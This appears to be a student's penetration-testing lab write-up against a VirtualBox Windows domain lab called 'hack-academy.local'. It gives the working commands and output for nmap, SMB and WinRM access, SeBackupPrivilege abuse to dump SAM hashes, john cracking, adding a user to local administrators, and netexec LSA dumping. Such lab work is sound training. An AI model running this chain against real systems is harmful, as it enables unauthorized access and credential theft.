# NMAP

```
┌──(xmen㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -Pn 10.0.2.7 --max-retries=1
[sudo] password for xmen: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-23 20:20 EDT
Stats: 0:01:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.0.2.7
Host is up (0.00056s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-24T00:23:54+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Client-1.hack-academy.local
| Not valid before: 2026-07-23T01:30:59
|_Not valid after:  2027-01-22T01:30:59
| rdp-ntlm-info: 
|   Target_Name: HACK-ACADEMY
|   NetBIOS_Domain_Name: HACK-ACADEMY
|   NetBIOS_Computer_Name: CLIENT-1
|   DNS_Domain_Name: hack-academy.local
|   DNS_Computer_Name: Client-1.hack-academy.local
|   DNS_Tree_Name: hack-academy.local
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-24T00:23:15+00:00
5040/tcp  open  unknown
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:80:1D:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT-1, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:80:1d:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-07-24T00:23:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.50 seconds
```

# SMB

Used smbclient to try to list shares

```
┌──(xmen㉿kali)-[~]
└─$ smbclient -N -L ////client-1.hack-academy.local
session setup failed: NT_STATUS_ACCESS_DENIED
```

Using assumed breach credentials:

```
┌──(xmen㉿kali)-[~]
└─$ smbclient ////client-1.hack-academy.local -U 'hack-academy.local/lbennett%!!reiD123'
do_connect: Connection to  failed (Error NT_STATUS_NOT_FOUND)
```

# SMB as twest

```
SMB         10.0.2.7        445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.7        445    CLIENT-1         Share           Permissions     Remark                                                                
SMB         10.0.2.7        445    CLIENT-1         -----           -----------     ------                                                                
SMB         10.0.2.7        445    CLIENT-1         ADMIN$          READ            Remote Admin                                                          
SMB         10.0.2.7        445    CLIENT-1         C$              READ,WRITE      Default share                                                         
SMB         10.0.2.7        445    CLIENT-1         IPC$            READ            Remote IPC                                 
```

This shows that we can read and write to C$ share on client-1. 

# WinRM as twest

This also succeeds allowing us to evil-winrm into twest user:

```
┌──(xmen㉿kali)-[~/bloodhound]
└─$ evil-winrm -u 'twest' -p 'HappyCactus$10' -i 10.0.2.7                   
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
                                        
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\twest\Documents> 
```

From here, running whoami /priv shows we have some good privileges:

```

*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeBackupPrivilege             Back up files and directories        Enabled
SeRestorePrivilege            Restore files and directories        Enabled
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

This allows us to abuse SeBackupPrivilege to get the local sam and system hives/registry keys which have password hashes we can then dump.

Followed the idea in [[windows-privesc-with-sebackupprivilege]] to use the DLLs and reg save system and sam followed by dumping them:

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbacf965a2426afda3d2207e4d6aa3904
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:156e3de3d13ba510e8c2b62f4f5d0216:::
Matt:1002:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
```

This gets us a hash for Matt (local account) which we can crack with john:

```
└─$ john matt_hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1!       (Matt)
```

This gives us the creds:

`Matt : Password1!`

Used netexec to see auth against the client-1 box:

```
──(xmen㉿kali)-[~/ad_chain1/client1]
└─$ netexec smb 10.0.2.7 -u 'Matt' -p 'Password1!' --shares --local-auth
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:CLIENT-1) (signing:False) (SMBv1:None)
SMB         10.0.2.7        445    CLIENT-1         [+] CLIENT-1\Matt:Password1! 
SMB         10.0.2.7        445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.7        445    CLIENT-1         Share           Permissions     Remark
SMB         10.0.2.7        445    CLIENT-1         -----           -----------     ------
SMB         10.0.2.7        445    CLIENT-1         ADMIN$                          Remote Admin
SMB         10.0.2.7        445    CLIENT-1         C$                              Default share
SMB         10.0.2.7        445    CLIENT-1         IPC$            READ            Remote IPC
```

Also checked RDP and actually can rdp as this user:

```
┌──(xmen㉿kali)-[~/ad_chain1/client1]
└─$ netexec rdp 10.0.2.7 -u 'Matt' -p 'Password1!' --local-auth
[*] Initializing RDP protocol database
RDP         10.0.2.7        3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:CLIENT-1) (nla:True)
RDP         10.0.2.7        3389   CLIENT-1         [+] CLIENT-1\Matt:Password1! (Pwn3d!)
```


This account is a local admin on the box which allows for dumping the LSA store by first adding the domain user twest to local administrators and then using netexec to dump:

```
netexec smb 10.0.2.7 -u 'twest' -p 'HappyCactus$10' --lsa
```

This dumps a bunch of hashes including a password hash for the domain user eknight which is an MS Cache hash type. Cracking with John leads to:

```
!!Stud87
```

Checking this against all machines shows it can read and write the admin$ share on client 2